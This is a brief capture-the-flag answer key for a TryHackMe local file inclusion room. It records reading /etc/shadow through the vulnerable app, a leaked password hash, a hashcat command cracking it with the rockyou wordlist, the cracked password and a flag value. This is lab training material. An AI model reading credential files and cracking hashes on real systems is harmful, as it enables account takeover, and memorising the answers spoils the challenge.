# LFI

[link](https://tryhackme.com/resources/blog/lfi/)

1. What is Charlie going to book a holiday to?
   Ans: Hawaii

2. Read /etc/shadow and crack Charlies password.
   Ans: password1
   `hashcat -m 1800 -a 0 '$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.' ~/hack/wordlists/rockyou.txt`

   ```json
   {
     "success": true,
   charlie:$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.:18243:0:99999:7:::
   }
   ```

3. What is flag1.txt?
   Ans:`THM{4ea2adf842713ad3ce0c1f05ef12256d}`
   1. ssh into Charlies machine
